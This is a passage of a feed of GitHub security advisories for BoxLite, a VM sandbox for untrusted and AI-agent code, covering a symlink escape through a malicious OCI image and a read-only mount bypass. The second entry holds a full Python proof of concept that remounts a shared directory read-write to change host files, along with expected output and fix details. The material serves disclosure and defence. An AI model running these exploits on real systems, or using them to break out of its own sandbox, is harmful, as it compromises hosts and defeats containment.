<p>This script constructs a malicious OCI image and passes it to the SimpleBox function via rootfs_path to create a container. In the malicious image, a symlink is first created pointing <code>escape</code> to <code>/tmp</code>, and then files are written under <code>escape</code>, thereby achieving file writes to the root filesystem.</p>
<p>Sample output:</p>
<pre><code>$ python3 poc_symlink_escape.py
============================================================
  PoC: BoxLite OCI Layer Extraction Symlink Escape
============================================================

[1] Building malicious OCI image → /tmp/malicious_oci_layout
  layer    sha256:a1e8b4de11d64fce…  (10240 B)
  config   sha256:8e245c2c65565998…  (191 B)
  manifest sha256:2dad6671e78d8093…  (415 B)

[2] Malicious layer tar entries:
    SYMLINK  escape -&gt; /tmp
    DIR      escape/boxlite_host_escape
    FILE     escape/boxlite_host_escape/pwned.txt
    FILE     etc/os-release

[3] Pre-exploit — target exists? False

[4] Loading malicious image via boxlite.SimpleBox(rootfs_path=…)
    Box error (expected): RuntimeError: internal error: Container init failed: Failed to start container: internal error: Failed to create container b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54 at bundle /run/boxlite/containers/b673b4e3400c71bd72464c98610c952e2164f70f946873b82adf3e6212851d54: failed to create container: exec process failed with error error in executing process : PATH environment variable is not set

[5] Post-exploit — target exists? True

  VULNERABLE — host file written successfully!
  Path: /tmp/boxlite_host_escape/pwned.txt
===== BOXLITE SYMLINK ESCAPE: HOST FILESYSTEM WRITE =====
Written at: ...
Target: /tmp/boxlite_host_escape/pwned.txt
========================================================
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>An attacker can craft a malicious OCI image and distribute it on image hosting platforms such as DockerHub, tricking users into using it. Once a user loads the malicious image, the attacker can write arbitrary content to any path on the host, which can further lead to remote code execution on the host.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 9.7, rationale as follows:</p>
<ul>
<li>AV:N — The attacker can distribute the malicious image over the network, tricking users into pulling and using it</li>
<li>AC:L — This is a logic vulnerability that requires no complex exploitation</li>
<li>PR:N — The attacker does not need any additional privileges to exploit this vulnerability</li>
<li>UI:R — The attacker needs to trick the victim into using the maliciously crafted image</li>
<li>S:C — The attacker can leverage the vulnerability to achieve arbitrary command execution on the host, extending the impact to the host operating system and crossing the security boundary</li>
<li>C:H/I:H/A:H — The attacker can leverage the vulnerability to gain RCE capability on the host, posing a significant threat to confidentiality, integrity, and availability</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to BoxLite for further discussion by emailing <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that Boxlite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-f396-4rp4-7v2j</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0148.html">https://rustsec.org/advisories/RUSTSEC-2026-0148.html</a></li>
<li><a href="https://github.com/advisories/GHSA-f396-4rp4-7v2j">https://github.com/advisories/GHSA-f396-4rp4-7v2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f396-4rp4-7v2j</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:54:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite-cli] BoxLite: Permission Bypass Allows Modification of Read-Only Files]]></title>
        <id>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</id>
        <link href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3"/>
        <updated>2026-05-21T21:52:52.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and launch OCI containers within them to run untrusted code.</p>
<p>One of the core security features claimed by Boxlite is the ability to mount host directories in read-only mode (read_only=True) into the VM via the virtiofs protocol (a host-guest shared filesystem protocol designed specifically for virtual machines), so that untrusted code can only read but not modify host data. Since the underlying function of the lightweight VM library libkrun used by Boxlite does not support mounting in read-only mode, Boxlite chooses to implement read-only by adding the MS_RDONLY flag when mounting the directory after the VM starts.</p>
<p>However, because Boxlite does not restrict the kernel capabilities available inside the container, malicious code can remount the directory in rw mode, thereby gaining write access to that directory. This allows malicious code to perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="details">Details</h4>
<ol>
<li>User-Facing API Documents Read-Only Guarantee</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/runtime/options.rs</code> <strong>Function:</strong> <code>VolumeSpec</code> (line 223) <strong>Code:</strong></p>
<pre><code class="language-rust">/// Filesystem mount specification.
pub struct VolumeSpec {
    pub host_path: String,
    pub guest_path: String,
    pub read_only: bool,  // &lt;-- operator sets this to restrict guest write access
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> field is documented (and in user-facing guides) as preventing the guest from writing to the host directory. The guarantee is "Agent can read but not write." This expectation is not met.</p>
<ol start="2">
<li>read_only Stored in FsShare — Passed to krun Without Enforcement</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/engine.rs</code> <strong>Function:</strong> <code>Krun::create()</code> (line 334) <strong>Code:</strong></p>
<pre><code class="language-rust">for share in config.fs_shares.shares() {
    let path_str = share.host_path.to_str().ok_or_else(|| { ... })?;

    tracing::info!(
        "  {} → {} ({})",
        share.tag,
        share.host_path.display(),
        if share.read_only { "ro" } else { "rw" }  // Logged but NOT passed to krun
    );
    ctx.add_virtiofs(&amp;share.tag, path_str)?;  // &lt;-- read_only silently dropped
}
</code></pre>
<p><strong>Issue:</strong> <code>share.read_only</code> is logged as "ro" or "rw" but is never passed to <code>add_virtiofs</code>. The actual hypervisor call receives only tag and host path.</p>
<ol start="3">
<li>Hypervisor FFI Has No Read-Only Parameter</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/context.rs</code> <strong>Function:</strong> <code>add_virtiofs()</code> (line 423) <strong>Code:</strong></p>
<pre><code class="language-rust">pub unsafe fn add_virtiofs(&amp;self, mount_tag: &amp;str, host_path: &amp;str) -&gt; BoxliteResult&lt;()&gt; {
    let host_path_c = CString::new(host_path)
        .map_err(|e| BoxliteError::Engine(format!("invalid host path: {e}")))?;
    let mount_tag_c = CString::new(mount_tag)
        .map_err(|e| BoxliteError::Engine(format!("invalid mount tag: {e}")))?;

    check_status("krun_add_virtiofs", unsafe {
        krun_add_virtiofs(self.ctx_id, mount_tag_c.as_ptr(), host_path_c.as_ptr())
        // No read_only parameter — libkrun exposes the share as read-write to the guest
    })
}
</code></pre>
<p><strong>Issue:</strong> <code>krun_add_virtiofs</code> in the FFI (<code>deps/libkrun-sys/src/lib.rs:35</code>) takes only <code>ctx_id</code>, <code>mount_tag</code>, and <code>host_path</code>. There is no read-only flag. Libkrun exposes the virtiofs share to the guest with full read-write access at the device level.</p>
<ol start="4">
<li>Read-Only Enforcement Is Delegated to Guest Agent (Zone 0)</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/volumes/guest_volume.rs</code> <strong>Function:</strong> <code>build_guest_mounts()</code> (line 184) <strong>Code:</strong></p>
<pre><code class="language-rust">for entry in &amp;self.fs_shares {
    let mount_point = entry.guest_path.as_deref().unwrap_or("");
    volumes.push(VolumeConfig::virtiofs(
        &amp;entry.tag,
        mount_point,
        entry.read_only,       // &lt;-- sent to guest agent as instruction
        entry.container_id.clone(),
    ));
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> flag is sent to the guest agent via gRPC as a mount instruction. The guest agent is expected to pass <code>-o ro</code> to the mount syscall. But the guest runs Zone 0 code — untrusted, assumed malicious. A compromised or malicious guest simply ignores this instruction.</p>
<ol start="5">
<li>FFI Declaration Confirms No Read-Only Variant Exists</li>
</ol>
<p><strong>File:</strong> <code>boxlite/deps/libkrun-sys/src/lib.rs</code> <strong>Function:</strong> <code>krun_add_virtiofs</code> extern declaration (line 35) <strong>Code:</strong></p>
<pre><code class="language-rust">extern "C" {
    pub fn krun_add_virtiofs(
        ctx_id: u32,
        mount_tag: *const c_char,
        host_path: *const c_char,
    ) -&gt; i32;
    // No krun_add_virtiofs_ro or equivalent declared
}
</code></pre>
<p><strong>Issue:</strong> There is no alternative read-only virtiofs FFI function declared. The entire codebase has no <code>krun_add_virtiofs_ro</code> or read-only parameter variant. Enforcement at the hypervisor level does not exist.</p>
<ol start="6">
<li>OCI Spec Builder Grants All Capabilities</li>
</ol>
<p> <strong>File:</strong> <code>guest/src/container/capabilities.rs</code> <strong>Function:</strong> <code>all_capabilities()</code> (line 19) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn all_capabilities() -&gt; HashSet&lt;Capability&gt; {
    [
        // ...
        Capability::SysModule,    // 16: load/unload kernel modules
        Capability::SysRawio,     // 17: perform I/O port operations
        Capability::SysAdmin,     // 21: various admin operations
        Capability::NetAdmin,     // 12: network administration
        Capability::NetRaw,       // 13: use RAW/PACKET sockets
        Capability::MacOverride,  // 32: override MAC
        Capability::Bpf,          // 39: BPF operations
        // ... all 41 capabilities
    ]
    .into_iter()
    .collect()
}
</code></pre>
<p><strong>Issue:</strong> Returns all 41 capabilities including the most dangerous ones, like <code>Capability::SysAdmin</code>. The function comment itself says "maximum compatibility but reduced security isolation."</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">import asyncio
import os
import tempfile
import sys
from boxlite import Boxlite, BoxOptions


async def run(box, cmd):
    """Run shell command via native box.exec API."""
    execution = await box.exec("sh", ["-c", cmd], None)
    stdout_stream = execution.stdout()
    stderr_stream = execution.stderr()

    stdout_lines, stderr_lines = [], []

    async def read_stdout():
        async for line in stdout_stream:
            stdout_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    async def read_stderr():
        async for line in stderr_stream:
            stderr_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    await asyncio.gather(read_stdout(), read_stderr())
    result = await execution.wait()

    return {
        'exit_code': result.exit_code,
        'stdout': ''.join(stdout_lines),
        'stderr': ''.join(stderr_lines),
    }

async def main():
    # Step 1: Set up host directory with a read-only file
    host_dir = tempfile.mkdtemp(prefix="virtiofs_ro_poc_")
    ro_file = os.path.join(host_dir, "read_only.txt")

    with open(ro_file, "w") as f:
        f.write("original content\n")

    print(f"[+] Step 1: Host directory created: {host_dir}")
    print(f"    read_only.txt: {open(ro_file).read().strip()}")
    print()

    guest_mount = "/mnt/sensitive"
    print(f"[+] Step 2: Launching BoxLite VM with:")
    print(f"    volumes=[('{host_dir}', '{guest_mount}', True)]  # read_only=True")
    print()

    try:
        runtime = Boxlite.default()
        opts = BoxOptions(
            image="alpine:latest",
            volumes=[(host_dir, guest_mount, True)],  # &lt;-- read_only=True
            memory_mib=512,
            cpus=1,
            auto_remove=True,
        )

        box = await runtime.create(opts)
        async with box:
            print("[+] Step 3: VM booted. Checking virtiofs mount state...")
            r = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    /proc/mounts: {r['stdout'].strip()}")
            print()

            print("[+] Step 4: Testing write protection (initial state)...")
            r2 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            out = r2['stdout'].strip()
            print(f"    Write attempt: {out}")
            if "Read-only" in out or "read-only" in out:
                print(f"    [OK] Initially blocked - client-side MS_RDONLY is active")
            print()

            print("[!!!] Step 5: ATTACK - Bypassing read-only via remount...")
            r3 = await run(box, f"mount -o remount,rw {guest_mount} 2&gt;&amp;1; echo remount_exit:$?")
            print(f"    Remount result: {r3['stdout'].strip()}")
            r4 = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    Mount flags after: {r4['stdout'].strip()}")
            print()

            print("[!!!] Step 6: Writing to 'read-only' mount after bypass...")
            r5 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            print(f"    Write result: {r5['stdout'].strip()}")
            r6 = await run(box, f"cat {guest_mount}/read_only.txt")
            print(f"    File content inside guest: {r6['stdout'].strip()}")
            print()

        print("[+] Step 7: HOST VERIFICATION")
        content = open(ro_file).read().strip()
        print(f"    read_only.txt on host: {content}")
        print()

        print("FINAL RESULT:")
        print()
        if content == "modified content":
            print("  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE")
        else:
            print("  [?] Bypass did not produce host-side writes.")

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        import shutil
        try:
            shutil.rmtree(host_dir)
            print(f"\n[+] Cleanup: removed {host_dir}")
        except:
            pass

asyncio.run(main())
</code></pre>
<p>This script mounts a directory in read-only mode into the sandbox and attempts to exploit the vulnerability to modify a file in that directory. Expected output:</p>
<pre><code>$ python poc.py
[+] Step 1: Host directory created: /tmp/virtiofs_ro_poc_93fdis21
    read_only.txt: original content

[+] Step 2: Launching BoxLite VM with:
    volumes=[('/tmp/virtiofs_ro_poc_93fdis21', '/mnt/sensitive', True)]  # read_only=True

[+] Step 3: VM booted. Checking virtiofs mount state...
    /proc/mounts: uservol0 /mnt/sensitive virtiofs ro,relatime 0 0

[+] Step 4: Testing write protection (initial state)...
    Write attempt: write_exit:1

[!!!] Step 5: ATTACK - Bypassing read-only via remount...
    Remount result: remount_exit:0
    Mount flags after: uservol0 /mnt/sensitive virtiofs rw,relatime 0 0

[!!!] Step 6: Writing to 'read-only' mount after bypass...
    Write result: write_exit:0
    File content inside guest: modified content

[+] Step 7: HOST VERIFICATION
    read_only.txt on host: modified content

FINAL RESULT:

  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE

[+] Cleanup: removed /tmp/virtiofs_ro_poc_93fdis21
</code></pre>
</li>
</ol>
<h4 id="impact">Impact</h4>
<p>Malicious code can perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="score">Score</h4>
<p>Severity: Critical, Score: 10.0, rationale as follows: </p>
<ul>
<li><strong>AV:N</strong> — Malicious code can be transmitted through networks, such as code written by large language models.</li>
<li><strong>AC:L</strong> — No special conditions or race conditions are required. The attacker simply executes a <code>mount -o remount,rw</code> command inside the container. <code>CAP_SYS_ADMIN</code> is granted by default, and the attack is deterministic and trivially reproducible.</li>
<li><strong>PR:N</strong> — The attacker needs the ability to execute arbitrary code inside the Boxlite sandbox, which is the fundamental use case of Boxlite (running untrusted code). </li>
<li><strong>UI:N</strong> — No user interaction is required. Malicious code inside the container can autonomously exploit this vulnerability without any action from the host operator.</li>
<li><strong>S:C</strong> — The vulnerability allows the attacker to cross the sandbox trust boundary and impact the host system. The vulnerable component is the Boxlite sandbox isolation mechanism, but the impacted component is the host filesystem.</li>
<li><strong>C:H</strong> — With write access to host directories, the attacker can plant malicious code that will be executed by the host, leading to full compromise of sensitive host data including credentials, API keys, user code, and configuration files mounted into the container.</li>
<li><strong>I:H</strong> — The attacker gains full write access to host directories explicitly intended to be read-only, allowing arbitrary modification of host files including planting backdoors, modifying virtual environments for supply chain attacks, and altering credentials and configuration files.</li>
<li><strong>A:N</strong> — The vulnerability primarily enables unauthorized write access. The host system and Boxlite service continue to function; no distinct availability impact mechanism exists beyond secondary consequences of write access.</li>
</ul>
<h4 id="credit">Credit</h4>
<p>This vulnerability was discovered by:</p>
<ul>
<li>XlabAI Team of Tencent Xuanwu Lab</li>
<li>Atuin Automated Vulnerability Discovery Engine</li>
</ul>
<p>CVE and credit are preferred.</p>
<p>If there are any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is <a href="mailto:xlabai@tencent.com">xlabai@tencent.com</a>.</p>
<h4 id="note">Note</h4>
<p>Note that BoxLite follows the industry-standard <strong>90+30 disclosure policy</strong> (Reference: <a href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html">https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html</a>). This means that BoxLite reserves the right to disclose the details of the vulnerability 30 days after the fix has been implemented.</p>
<h4 id="resolution">Resolution</h4>
<p>Fixed in <strong>v0.9.0</strong> by PR #454 (commit <code>2c26968e</code>), released 2026-04-29, with defense-in-depth across three layers:</p>
<ol>
<li><strong>Hypervisor-level read-only enforcement.</strong> virtio-fs shares are now created via <code>krun_add_virtiofs3</code> (libkrun v1.18.0) with the <code>read_only</code> flag passed through, so the share is read-only at the virtio-fs device — before any request reaches the guest kernel. A malicious guest <code>mount -o remount,rw</code> can no longer reach host data even if it regained <code>CAP_SYS_ADMIN</code>.</li>
<li><strong>Capability restriction.</strong> Containers now receive the 14 Docker-default capabilities, explicitly excluding <code>CAP_SYS_ADMIN</code> (and <code>CAP_NET_ADMIN</code>, <code>CAP_SYS_MODULE</code>, <code>CAP_SYS_RAWIO</code>, <code>CAP_MAC_OVERRIDE</code>), so the remount in the PoC fails with <code>EPERM</code>.</li>
<li><strong>TSI network isolation.</strong> When the network is disabled, the implicit vsock is replaced with an explicit vsock with no TSI features, closing a related guest→host socket-forwarding path.</li>
</ol>
<p>Regression coverage: <code>src/boxlite/tests/security_enforcement.rs</code> (Rust core) and <code>sdks/python/tests/test_readonly_volume_remount.py</code> (Python SDK) both replay the PoC remount attack and assert it fails.</p>
<p><strong>Remediation:</strong> upgrade to boxlite <strong>0.9.0 or later</strong> (all SDKs: PyPI <code>boxlite</code>, npm <code>@boxlite-ai/boxlite</code>, Go module <code>github.com/boxlite-ai/boxlite/sdks/go</code>, crates.io <code>boxlite</code> / <code>boxlite-cli</code>). There is no workaround for affected versions; upgrade is required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
<li><a href="https://github.com/boxlite-ai/boxlite/pull/454">https://github.com/boxlite-ai/boxlite/pull/454</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0147.html">https://rustsec.org/advisories/RUSTSEC-2026-0147.html</a></li>
<li><a href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3">https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-21T21:52:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[boxlite] BoxLite: Permission Bypass Allows Modification of Read-Only Files]]></title>
        <id>https://github.com/advisories/GHSA-g6ww-w5j2-r7x3</id>
        <link href="https://github.com/advisories/GHSA-g6ww-w5j2-r7x3"/>
        <updated>2026-05-21T21:52:52.000Z</updated>
        <content type="html"><![CDATA[<h4 id="summary">Summary</h4>
<p>Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and launch OCI containers within them to run untrusted code.</p>
<p>One of the core security features claimed by Boxlite is the ability to mount host directories in read-only mode (read_only=True) into the VM via the virtiofs protocol (a host-guest shared filesystem protocol designed specifically for virtual machines), so that untrusted code can only read but not modify host data. Since the underlying function of the lightweight VM library libkrun used by Boxlite does not support mounting in read-only mode, Boxlite chooses to implement read-only by adding the MS_RDONLY flag when mounting the directory after the VM starts.</p>
<p>However, because Boxlite does not restrict the kernel capabilities available inside the container, malicious code can remount the directory in rw mode, thereby gaining write access to that directory. This allows malicious code to perform arbitrary write operations on directories that should be read-only.</p>
<p>In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.</p>
<h4 id="details">Details</h4>
<ol>
<li>User-Facing API Documents Read-Only Guarantee</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/runtime/options.rs</code> <strong>Function:</strong> <code>VolumeSpec</code> (line 223) <strong>Code:</strong></p>
<pre><code class="language-rust">/// Filesystem mount specification.
pub struct VolumeSpec {
    pub host_path: String,
    pub guest_path: String,
    pub read_only: bool,  // &lt;-- operator sets this to restrict guest write access
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> field is documented (and in user-facing guides) as preventing the guest from writing to the host directory. The guarantee is "Agent can read but not write." This expectation is not met.</p>
<ol start="2">
<li>read_only Stored in FsShare — Passed to krun Without Enforcement</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/engine.rs</code> <strong>Function:</strong> <code>Krun::create()</code> (line 334) <strong>Code:</strong></p>
<pre><code class="language-rust">for share in config.fs_shares.shares() {
    let path_str = share.host_path.to_str().ok_or_else(|| { ... })?;

    tracing::info!(
        "  {} → {} ({})",
        share.tag,
        share.host_path.display(),
        if share.read_only { "ro" } else { "rw" }  // Logged but NOT passed to krun
    );
    ctx.add_virtiofs(&amp;share.tag, path_str)?;  // &lt;-- read_only silently dropped
}
</code></pre>
<p><strong>Issue:</strong> <code>share.read_only</code> is logged as "ro" or "rw" but is never passed to <code>add_virtiofs</code>. The actual hypervisor call receives only tag and host path.</p>
<ol start="3">
<li>Hypervisor FFI Has No Read-Only Parameter</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/vmm/krun/context.rs</code> <strong>Function:</strong> <code>add_virtiofs()</code> (line 423) <strong>Code:</strong></p>
<pre><code class="language-rust">pub unsafe fn add_virtiofs(&amp;self, mount_tag: &amp;str, host_path: &amp;str) -&gt; BoxliteResult&lt;()&gt; {
    let host_path_c = CString::new(host_path)
        .map_err(|e| BoxliteError::Engine(format!("invalid host path: {e}")))?;
    let mount_tag_c = CString::new(mount_tag)
        .map_err(|e| BoxliteError::Engine(format!("invalid mount tag: {e}")))?;

    check_status("krun_add_virtiofs", unsafe {
        krun_add_virtiofs(self.ctx_id, mount_tag_c.as_ptr(), host_path_c.as_ptr())
        // No read_only parameter — libkrun exposes the share as read-write to the guest
    })
}
</code></pre>
<p><strong>Issue:</strong> <code>krun_add_virtiofs</code> in the FFI (<code>deps/libkrun-sys/src/lib.rs:35</code>) takes only <code>ctx_id</code>, <code>mount_tag</code>, and <code>host_path</code>. There is no read-only flag. Libkrun exposes the virtiofs share to the guest with full read-write access at the device level.</p>
<ol start="4">
<li>Read-Only Enforcement Is Delegated to Guest Agent (Zone 0)</li>
</ol>
<p><strong>File:</strong> <code>boxlite/src/volumes/guest_volume.rs</code> <strong>Function:</strong> <code>build_guest_mounts()</code> (line 184) <strong>Code:</strong></p>
<pre><code class="language-rust">for entry in &amp;self.fs_shares {
    let mount_point = entry.guest_path.as_deref().unwrap_or("");
    volumes.push(VolumeConfig::virtiofs(
        &amp;entry.tag,
        mount_point,
        entry.read_only,       // &lt;-- sent to guest agent as instruction
        entry.container_id.clone(),
    ));
}
</code></pre>
<p><strong>Issue:</strong> The <code>read_only</code> flag is sent to the guest agent via gRPC as a mount instruction. The guest agent is expected to pass <code>-o ro</code> to the mount syscall. But the guest runs Zone 0 code — untrusted, assumed malicious. A compromised or malicious guest simply ignores this instruction.</p>
<ol start="5">
<li>FFI Declaration Confirms No Read-Only Variant Exists</li>
</ol>
<p><strong>File:</strong> <code>boxlite/deps/libkrun-sys/src/lib.rs</code> <strong>Function:</strong> <code>krun_add_virtiofs</code> extern declaration (line 35) <strong>Code:</strong></p>
<pre><code class="language-rust">extern "C" {
    pub fn krun_add_virtiofs(
        ctx_id: u32,
        mount_tag: *const c_char,
        host_path: *const c_char,
    ) -&gt; i32;
    // No krun_add_virtiofs_ro or equivalent declared
}
</code></pre>
<p><strong>Issue:</strong> There is no alternative read-only virtiofs FFI function declared. The entire codebase has no <code>krun_add_virtiofs_ro</code> or read-only parameter variant. Enforcement at the hypervisor level does not exist.</p>
<ol start="6">
<li>OCI Spec Builder Grants All Capabilities</li>
</ol>
<p> <strong>File:</strong> <code>guest/src/container/capabilities.rs</code> <strong>Function:</strong> <code>all_capabilities()</code> (line 19) <strong>Code:</strong></p>
<pre><code class="language-rust">pub fn all_capabilities() -&gt; HashSet&lt;Capability&gt; {
    [
        // ...
        Capability::SysModule,    // 16: load/unload kernel modules
        Capability::SysRawio,     // 17: perform I/O port operations
        Capability::SysAdmin,     // 21: various admin operations
        Capability::NetAdmin,     // 12: network administration
        Capability::NetRaw,       // 13: use RAW/PACKET sockets
        Capability::MacOverride,  // 32: override MAC
        Capability::Bpf,          // 39: BPF operations
        // ... all 41 capabilities
    ]
    .into_iter()
    .collect()
}
</code></pre>
<p><strong>Issue:</strong> Returns all 41 capabilities including the most dangerous ones, like <code>Capability::SysAdmin</code>. The function comment itself says "maximum compatibility but reduced security isolation."</p>
<h4 id="poc">PoC</h4>
<ol>
<li><p>Install Boxlite following the official tutorial.</p>
</li>
<li><p>Run the following Python script:</p>
<pre><code class="language-python">import asyncio
import os
import tempfile
import sys
from boxlite import Boxlite, BoxOptions


async def run(box, cmd):
    """Run shell command via native box.exec API."""
    execution = await box.exec("sh", ["-c", cmd], None)
    stdout_stream = execution.stdout()
    stderr_stream = execution.stderr()

    stdout_lines, stderr_lines = [], []

    async def read_stdout():
        async for line in stdout_stream:
            stdout_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    async def read_stderr():
        async for line in stderr_stream:
            stderr_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))

    await asyncio.gather(read_stdout(), read_stderr())
    result = await execution.wait()

    return {
        'exit_code': result.exit_code,
        'stdout': ''.join(stdout_lines),
        'stderr': ''.join(stderr_lines),
    }

async def main():
    # Step 1: Set up host directory with a read-only file
    host_dir = tempfile.mkdtemp(prefix="virtiofs_ro_poc_")
    ro_file = os.path.join(host_dir, "read_only.txt")

    with open(ro_file, "w") as f:
        f.write("original content\n")

    print(f"[+] Step 1: Host directory created: {host_dir}")
    print(f"    read_only.txt: {open(ro_file).read().strip()}")
    print()

    guest_mount = "/mnt/sensitive"
    print(f"[+] Step 2: Launching BoxLite VM with:")
    print(f"    volumes=[('{host_dir}', '{guest_mount}', True)]  # read_only=True")
    print()

    try:
        runtime = Boxlite.default()
        opts = BoxOptions(
            image="alpine:latest",
            volumes=[(host_dir, guest_mount, True)],  # &lt;-- read_only=True
            memory_mib=512,
            cpus=1,
            auto_remove=True,
        )

        box = await runtime.create(opts)
        async with box:
            print("[+] Step 3: VM booted. Checking virtiofs mount state...")
            r = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    /proc/mounts: {r['stdout'].strip()}")
            print()

            print("[+] Step 4: Testing write protection (initial state)...")
            r2 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            out = r2['stdout'].strip()
            print(f"    Write attempt: {out}")
            if "Read-only" in out or "read-only" in out:
                print(f"    [OK] Initially blocked - client-side MS_RDONLY is active")
            print()

            print("[!!!] Step 5: ATTACK - Bypassing read-only via remount...")
            r3 = await run(box, f"mount -o remount,rw {guest_mount} 2&gt;&amp;1; echo remount_exit:$?")
            print(f"    Remount result: {r3['stdout'].strip()}")
            r4 = await run(box, f"cat /proc/mounts | grep sensitive")
            print(f"    Mount flags after: {r4['stdout'].strip()}")
            print()

            print("[!!!] Step 6: Writing to 'read-only' mount after bypass...")
            r5 = await run(box, f"echo 'modified content' &gt; {guest_mount}/read_only.txt 2&gt;&amp;1; echo write_exit:$?")
            print(f"    Write result: {r5['stdout'].strip()}")
            r6 = await run(box, f"cat {guest_mount}/read_only.txt")
            print(f"    File content inside guest: {r6['stdout'].strip()}")
            print()

        print("[+] Step 7: HOST VERIFICATION")
        content = open(ro_file).read().strip()
        print(f"    read_only.txt on host: {content}")
        print()

        print("FINAL RESULT:")
        print()
        if content == "modified content":
            print("  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE")
        else:
            print("  [?] Bypass did not produce host-side writes.")

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        import shutil
        try:
            shutil.rmtree(host_dir)
            print(f"\n[+] Cleanup: removed {host_dir}")
        except:
            pass

asyncio.run(main())
</code></pre>
<p>This script mounts a directory in read-only mode into the sandbox and attempts to exploit the vulnerability to modify a file in that directory. Expected output:</p>
<pre><code>$ python poc.py
[+] Step 1: Host directory created: /tmp/virtiofs_ro_poc_93fdis21
    read_only.txt: original content

[+] Step 2: Launching BoxLite VM with:
    volumes=[('/tmp/virtiofs_ro_poc_93fdis21', '/mnt/sensitive', True)]  # read_only=True

[+] Step 3: VM booted. Checking virtiofs mount state...
